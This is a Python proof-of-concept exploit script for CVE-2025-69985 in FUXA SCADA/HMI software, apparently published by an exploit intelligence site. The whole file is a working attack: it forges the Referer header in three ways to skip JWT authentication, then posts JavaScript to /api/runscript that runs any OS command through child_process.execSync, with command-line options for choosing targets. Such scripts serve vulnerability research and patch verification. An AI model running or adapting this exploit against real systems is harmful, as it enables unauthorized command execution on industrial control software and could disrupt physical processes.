#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : FUXA <= 1.2.8 Authentication Bypass + RCE
# CVE            : CVE-2025-69985
# Vendor         : frangoteam
# Product        : FUXA
# Affected       : All versions <= 1.2.8 (through v1.2.11 / latest)
# Type           : CWE-288 - Authentication Bypass Using Alternate Path
# CVSS           : 9.8 (Critical)
# Platform       : Node.js / Docker
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC for CVE-2025-69985: FUXA <= 1.2.8 Authentication Bypass + RCE

Demonstrates CWE-288 (Authentication Bypass Using an Alternate Path or Channel)
in FUXA SCADA/HMI software. The requireAuth middleware improperly trusts the HTTP
Referer header, allowing unauthenticated access to the /api/runscript endpoint
which executes arbitrary JavaScript (Node.js) code via Module._compile().

ATTACK CHAIN:
  1. Spoof Referer header to bypass requireAuth JWT check
  2. POST crafted JavaScript payload to /api/runscript
  3. Server compiles and executes the code via runTestScript -> Module._compile()
  4. Arbitrary OS command execution via child_process.execSync()

PREREQUISITES:
  - Network access to FUXA instance on port 1881
  - Python 3 (stdlib only)

REFERENCES:
  - CVE-2025-69985 / GHSA-4r4r-4jp4-wwf9
  - https://nvd.nist.gov/vuln/detail/CVE-2025-69985
"""

import sys
import json
import http.client
import urllib.parse


# --- Configuration ---
DEFAULT_HOST = "localhost"
DEFAULT_PORT = 1881
DEFAULT_COMMAND = "id"


def build_payload(command):
    """
    Build the /api/runscript JSON payload.

    The payload exploits the 'test' field of the script object. When test is truthy,
    the server routes execution to runTestScript() in server/runtime/scripts/msm.js,
    which compiles the 'code' field into a Node.js module function using Module._compile()
    and executes it with full access to require() and child_process.

    Args:
        command: OS command to execute on the target

    Returns:
        JSON string payload
    """
    # Escape command for embedding in JavaScript string literal
    escaped_cmd = (command
                   .replace("\\", "\\\\")
                   .replace('"', '\\"')
                   .replace("`", "\\`")
                   .replace("\n", "\\n"))

    js_code = (
        'const cp = require("child_process");'
        "try {"
        f'  const result = cp.execSync("{escaped_cmd}", {{ encoding: "utf8", timeout: 10000 }});'
        "  return result.toString();"
        "} catch (err) {"
        '  return "ERROR: " + err.message'
        '    + (err.stdout ? "\\nSTDOUT: " + err.stdout.toString() : "")'
        '    + (err.stderr ? "\\nSTDERR: " + err.stderr.toString() : "");'
        "}"
    )

    payload = {
        "params": {
            "script": {
                "test": True,
                "name": "exploit",
                "code": js_code,
                "parameters": []
            }
        }
    }

    return json.dumps(payload)


def exploit(target_host, target_port, command, bypass_method="host"):
    """
    Execute the auth bypass + RCE exploit against a FUXA instance.

    The requireAuth middleware in server/api/jwt-helper.js has multiple bypass paths
    based on the Referer header value. This function supports all three:

    1. 'host'    - Referer matches http://<Host header value>/...
    2. 'pattern' - Referer contains /fuxa, /editor, /viewer, /lab, or /home
    3. 'local'   - Referer contains localhost:, 127.0.0.1:, or 0.0.0.0:

    Args:
        target_host: IP or hostname of the FUXA instance
        target_port: Port number (default 1881)
        command: OS command to execute
        bypass_method: One of 'host', 'pattern', 'local'

    Returns:
        Tuple of (success: bool, output: str)
    """
    # Step 1: Craft the Referer header based on bypass method
    if bypass_method == "host":
        # Matches: referer.startsWith(`http://${requestHost}`)
        # The server compares against req.headers.host which includes the port
        referer = f"http://{target_host}:{target_port}/fuxa"
    elif bypass_method == "pattern":
        # Matches: fuxaPatterns.some(pattern => referer.includes(pattern))
        # Uses /fuxa in an external attacker-controlled URL
        referer = "http://attacker.example.com/fuxa"
    elif bypass_method == "local":
        # Matches: referer.includes('localhost:')
        referer = "http://localhost:31337/"
    else:
        print(f"[-] Unknown bypass method: {bypass_method}")
        return False, ""

    # Step 2: Build the RCE payload
    body = build_payload(command)

    # Step 3: Set request headers
    headers = {
        "Content-Type": "application/json",
        "Referer": referer,
    }

    print(f"[*] Target: http://{target_host}:{target_port}")
    print(f"[*] Bypass method: {bypass_method}")
    print(f"[*] Referer: {referer}")
    print(f"[*] Command: {command}")
    print(f"[*] Sending POST /api/runscript ...")

    # Step 4: Send the exploit request
    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=15)
        conn.request("POST", "/api/runscript", body=body, headers=headers)
        response = conn.getresponse()
        status = response.status
        output = response.read().decode("utf-8", errors="replace").strip()
        conn.close()
    except ConnectionRefusedError:
        print(f"[-] Connection refused to {target_host}:{target_port}")
        return False, ""
    except TimeoutError:
        print(f"[-] Connection timed out to {target_host}:{target_port}")
        return False, ""
    except Exception as e:
        print(f"[-] Request failed: {type(e).__name__}: {e}")
        return False, ""

    # Step 5: Evaluate the response
    print(f"[*] HTTP Status: {status}")

    if status == 200:
        # Strip surrounding quotes if the response is JSON-encoded string
        if output.startswith('"') and output.endswith('"'):
            try:
                output = json.loads(output)
            except json.JSONDecodeError:
                pass

        print(f"[+] SUCCESS - Command executed via CVE-2025-69985!")
        print(f"[+] Auth bypass method: {bypass_method}")
        print()
        print("=" * 60)
        print("  COMMAND OUTPUT")
        print("=" * 60)
        print(output if output else "(no output)")
        print("=" * 60)
        return True, output
    elif status == 401:
        print(f"[-] FAILED - Authentication required (bypass did not work)")
        print(f"    Response: {output[:200]}")
        return False, output
    else:
        print(f"[-] Unexpected response: HTTP {status}")
        print(f"    Response: {output[:500]}")
        return False, output


def test_all_bypass_methods(target_host, target_port, command):
    """
    Test all three Referer bypass methods to comprehensively demonstrate the vulnerability.

    Returns:
        dict mapping bypass method name to (success, output) tuple
    """
    methods = ["host", "pattern", "local"]
    results = {}

    for method in methods:
        print()
        print("#" * 60)
        print(f"  Testing bypass method: {method}")
        print("#" * 60)
        success, output = exploit(target_host, target_port, command, bypass_method=method)
        results[method] = (success, output)
        print()

    # Summary
    print()
    print("=" * 60)
    print("  BYPASS METHOD SUMMARY")
    print("=" * 60)
    for method, (success, _) in results.items():
        status = "BYPASSED" if success else "BLOCKED"
        icon = "[+]" if success else "[-]"
        print(f"  {icon} {method:10s} -> {status}")
    print("=" * 60)

    return results


def main():
    """Main entry point."""
    import argparse

    parser = argparse.ArgumentParser(
        description="CVE-2025-69985: FUXA <= 1.2.8 Auth Bypass + RCE PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s                                    # Default: id on localhost:1881
  %(prog)s -t 10.0.0.5 -c "whoami"           # Run whoami on custom target
  %(prog)s -t 10.0.0.5 --all-methods         # Test all 3 bypass methods
  %(prog)s -t 10.0.0.5 -b pattern -c "uname -a"  # Specific bypass method
        """
    )
    parser.add_argument("-t", "--target", default=DEFAULT_HOST,
                        help=f"Target host (default: {DEFAULT_HOST})")
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
                        help=f"Target port (default: {DEFAULT_PORT})")
    parser.add_argument("-c", "--command", default=DEFAULT_COMMAND,
                        help=f"Command to execute (default: {DEFAULT_COMMAND})")
    parser.add_argument("-b", "--bypass", choices=["host", "pattern", "local"],
                        default="host",
                        help="Bypass method: host (same-host Referer), "
                             "pattern (/fuxa from external), local (localhost:)")
    parser.add_argument("--all-methods", action="store_true",
                        help="Test all 3 bypass methods")

    args = parser.parse_args()

    print()
    print("=" * 60)
    print("  CVE-2025-69985: FUXA <= 1.2.8 Auth Bypass + RCE")
    print("  CWE-288: Authentication Bypass via Alternate Channel")
    print("=" * 60)

    if args.all_methods:
        results = test_all_bypass_methods(args.target, args.port, args.command)
        any_success = any(s for s, _ in results.values())
        sys.exit(0 if any_success else 1)
    else:
        success, output = exploit(args.target, args.port, args.command,
                                  bypass_method=args.bypass)
        sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
